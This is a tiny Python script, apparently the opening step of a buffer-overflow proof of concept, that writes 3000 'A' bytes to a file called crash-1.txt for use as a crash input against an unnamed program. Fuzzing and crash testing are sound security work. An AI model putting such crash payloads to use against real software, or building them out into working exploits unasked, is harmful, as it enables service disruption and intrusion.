with open("crash-1.txt", "wb") as f:
    
    buf = b"\x41"*3000
    f.write(buf)
    f.close()
